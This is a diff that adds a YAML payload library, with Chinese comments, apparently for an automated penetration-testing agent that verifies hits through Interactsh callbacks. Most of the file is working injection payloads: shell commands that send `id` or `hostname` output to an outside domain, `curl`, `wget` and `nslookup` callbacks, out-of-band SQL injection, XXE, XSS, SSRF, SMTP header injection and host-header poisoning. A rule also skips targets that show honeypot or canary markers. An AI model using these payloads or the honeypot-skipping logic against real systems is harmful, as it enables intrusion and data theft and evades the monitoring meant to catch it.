@@ -1,0 +1,203 @@
+# knowledge/rules/oast_patterns.yaml
+# SAM-∞ v28-Ω  OAST (Out-of-Band Application Security Testing) Pattern Templates
+# ──────────────────────────────────────────────────────────────────────────────
+# 与 oracle/xbow_verifier.py 的 RSA/AES Interactsh 接口严格对齐
+# 所有 payload 模板中的变量：
+#   {oast_domain}       — Interactsh 分配的域名（如 abc123.oast.pro）
+#   {correlation_id}    — 唯一关联 ID（32 字符十六进制）
+#   {oast_server}       — Interactsh 服务器地址
+# ──────────────────────────────────────────────────────────────────────────────
+
+meta:
+  version: "1.0.0"
+  last_updated: "2026-10-27"
+  description: "OAST payload 模板库：DNS/HTTP/SMTP 三类；与 xbow_verifier.py RSA/AES 接口对齐"
+
+# ── Interactsh 服务器配置 ──────────────────────────────────────────────────────
+servers:
+  public:
+    primary: "oast.pro"
+    secondary: "oast.live"
+    tertiary: "oast.site"
+    note: "公共服务器默认使用；轮询间隔 5 秒"
+
+  private:
+    env_var: "OAST_PRIVATE_SERVER"
+    note: "若设置 OAST_PRIVATE_SERVER 环境变量，优先使用自托管服务器"
+
+# ── Interactsh 协议规范 ────────────────────────────────────────────────────────
+protocol:
+  registration:
+    endpoint: "POST https://{oast_server}/register"
+    required_fields:
+      - "public-key"      # RSA-2048 公钥，base64-DER 编码（必须！否则 HTTP 400）
+      - "correlation-id"  # 32 字符十六进制 correlation ID
+      - "secret-key"      # 32 字符十六进制 secret key
+    response_fields:
+      - "domain"          # 分配的 OAST 域名（如 abc123.oast.pro）
+    error: "缺少 public-key 字段将返回 HTTP 400（严禁发送裸 JSON）"
+
+  polling:
+    endpoint: "GET https://{oast_server}/poll"
+    params:
+      - "id"      # correlation_id
+      - "secret"  # secret_key
+    response_fields:
+      - "data"    # AES 加密的交互数据（base64 列表）
+      - "aes_key" # RSA 加密的 AES 密钥（base64）
+      - "extra"   # 附加信息
+
+  decryption:
+    step1: "用 RSA-2048 私钥（OAEP-SHA256）解密 aes_key → 得到 AES-256 密钥"
+    step2_ctr: "用 AES-256-CTR 解密 data → 新集群"
+    step2_cfb: "用 AES-256-CFB 解密 data → 旧集群（兼容）"
+    note: "先尝试 CTR，失败则尝试 CFB"
+
+  interaction_validation:
+    required_fields:
+      - "correlation-id"  # 必须与注入的 correlation_id 匹配
+      - "type"            # dns / http / smtp
+      - "remote-address"  # 发起请求的 IP（用于 false-positive 排除）
+    valid_types:
+      - "dns"
+      - "http"
+      - "smtp"
+
+# ── DNS 型 OAST payload 模板 ──────────────────────────────────────────────────
+dns_payloads:
+  basic:
+    payloads:
+      - "{correlation_id}.{oast_domain}"
+    note: "最基础的 DNS 查询触发"
+
+  subdomain_data_exfil:
+    payloads:
+      - "$(id|xxd -p|tr -d '\\n').{oast_domain}"
+      - "$(hostname|xxd -p).{oast_domain}"
+    note: "通过 subdomain 带外数据提取（Linux 命令执行验证）"
+
+  nslookup_inject:
+    payloads:
+      - ";nslookup {correlation_id}.{oast_domain}"
+      - "|nslookup {correlation_id}.{oast_domain}"
+      - "&&nslookup {correlation_id}.{oast_domain}"
+      - "`nslookup {correlation_id}.{oast_domain}`"
+      - "$(nslookup {correlation_id}.{oast_domain})"
+    context: "命令注入场景"
+
+  windows_dns:
+    payloads:
+      - "&nslookup {correlation_id}.{oast_domain}&"
+      - "& ping -n 1 {correlation_id}.{oast_domain} &"
+    context: "Windows 命令注入"
+
+  sql_dns:
+    mysql:
+      - "' AND LOAD_FILE(CONCAT('\\\\\\\\','{correlation_id}.{oast_domain}','\\\\file'))-- -"
+    mssql:
+      - "'; EXEC master..xp_dirtree '\\\\{correlation_id}.{oast_domain}\\share'-- -"
+    oracle_db:
+      - "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('{correlation_id}.{oast_domain}') FROM dual-- -"
+
+  ssrf_dns:
+    payloads:
+      - "http://{correlation_id}.{oast_domain}/"
+      - "ftp://{correlation_id}.{oast_domain}/"
+    context: "SSRF 触发 DNS 查询"
+
+  xxe_dns:
+    payloads:
+      - |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "http://{correlation_id}.{oast_domain}/xxe">
+        ]>
+        <foo>&xxe;</foo>
+    context: "XXE（XML 外部实体）触发 DNS/HTTP"
+
+# ── HTTP 型 OAST payload 模板 ─────────────────────────────────────────────────
+http_payloads:
+  basic:
+    payloads:
+      - "http://{oast_domain}/{correlation_id}"
+      - "https://{oast_domain}/{correlation_id}"
+
+  with_data:
+    payloads:
+      - "http://{oast_domain}/{correlation_id}/$(id|base64 -w0)"
+      - "http://{oast_domain}/{correlation_id}/$(whoami)"
+    context: "RCE 验证：URL 路径携带命令执行结果"
+
+  xss_callback:
+    payloads:
+      - "<script>fetch('http://{oast_domain}/{correlation_id}')</script>"
+      - "<img src=x onerror=\"fetch('http://{oast_domain}/{correlation_id}')\"/>"
+      - "<svg onload=\"new Image().src='http://{oast_domain}/{correlation_id}'\">"
+    context: "存储型 XSS 验证"
+
+  ssrf_http:
+    payloads:
+      - "http://{oast_domain}/{correlation_id}"
+      - "http://user@{oast_domain}/{correlation_id}"
+    context: "SSRF HTTP 回调"
+
+  curl_inject:
+    payloads:
+      - ";curl http://{oast_domain}/{correlation_id}"
+      - ";wget -q -O- http://{oast_domain}/{correlation_id}"
+    context: "命令注入 HTTP 回调"
+
+  password_reset_poisoning:
+    headers:
+      - "Host: {oast_domain}"
+      - "X-Forwarded-Host: {oast_domain}"
+      - "X-Host: {oast_domain}"
+    context: "密码重置 poisoning"
+
+# ── SMTP 型 OAST payload ──────────────────────────────────────────────────────
+smtp_payloads:
+  basic:
+    payloads:
+      - "{correlation_id}@{oast_domain}"
+    note: "邮件地址型 OAST（某些应用发送确认邮件时触发 MX 查询）"
+
+  smtp_injection:
+    payloads:
+      - "user@domain.com\r\nBcc: {correlation_id}@{oast_domain}"
+      - "user@domain.com%0d%0aBcc:{correlation_id}@{oast_domain}"
+    context: "SMTP 头部注入"
+
+# ── 等待策略 ────────────────────────────────────────────────────────────────────
+polling_strategy:
+  default_timeout_seconds: 30
+  poll_interval_seconds: 5
+  max_poll_attempts: 6     # 30 / 5 = 6 次轮询
+
+  vuln_specific:
+    ssrf: {timeout: 30, interval: 5}
+    rce: {timeout: 30, interval: 5}
+    sqli_oob: {timeout: 45, interval: 5}
+    xss_stored: {timeout: 300, interval: 15}   # 需等待管理员触发
+    xxe: {timeout: 30, interval: 5}
+    general: {timeout: 30, interval: 5}
+
+# ── False-Positive 排除 ────────────────────────────────────────────────────────
+false_positive_prevention:
+  self_trigger_check:
+    description: "若 OAST 回调来源 IP 是自身代理出口 IP，则为 false-positive"
+    method: "在注入前记录代理出口 IP，收到回调时比对 remote-address"
+
+  replay_verification:
+    description: "通过 Oracle 验证后，用新 correlation_id 重放 payload 再次确认"
+    note: "减少网络抖动导致的误报"
+
+  honeypot_detection:
+    markers:
+      - "honeypot"
+      - "honeytrap"
+      - "thinkst canary"
+    action: "发现标记则跳过目标，记录蜜罐警告"
+
+distilled_rules: []
+total_distilled_rules: 0
+last_updated: "2026-10-27"
